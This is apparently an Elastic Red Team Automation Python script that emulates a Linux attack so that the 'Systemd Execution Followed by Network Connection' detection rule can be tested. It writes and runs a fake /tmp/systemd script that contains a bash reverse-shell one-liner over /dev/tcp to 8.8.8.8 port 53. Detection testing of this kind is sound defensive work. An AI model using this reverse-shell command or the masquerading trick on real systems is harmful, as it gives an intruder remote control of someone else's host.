# Copyright Elasticsearch B.V. and/or licensed to Elasticsearch B.V. under one
# or more contributor license agreements. Licensed under the Elastic License
# 2.0; you may not use this file except in compliance with the Elastic License
# 2.0.

from . import common
from . import RtaMetadata

metadata = RtaMetadata(
    uuid="517a466b-f11f-4469-8e5a-a39f4edf333a",
    platforms=["linux"],
    endpoint=[
        {
            "rule_name": "Systemd Execution Followed by Network Connection",
            "rule_id": "6644d936-36a2-4d21-95f3-4826e6b61b9b"
        }
    ],
    techniques=["T1543", "T1059", "T1071"],
)


@common.requires_os(*metadata.platforms)
def main():

    shell_command = "/bin/bash"
    shell_args = "-c 'sh -i >& /dev/tcp/8.8.8.8/53 0>&1'"
    parent_process = "/tmp/systemd"

    # Create the fake parent process script
    with open(parent_process, "w") as script:
        script.write("#!/bin/bash\n")
        script.write(f"{shell_command} {shell_args}\n")

    # Make the script executable
    common.execute(['chmod', '+x', parent_process])

    # Execute the fake parent process script
    common.log("Executing the fake parent process script")
    common.execute([parent_process])
    common.log("RTA execution completed.")

    # Cleanup
    common.remove_file(parent_process)


if __name__ == "__main__":
    exit(main())
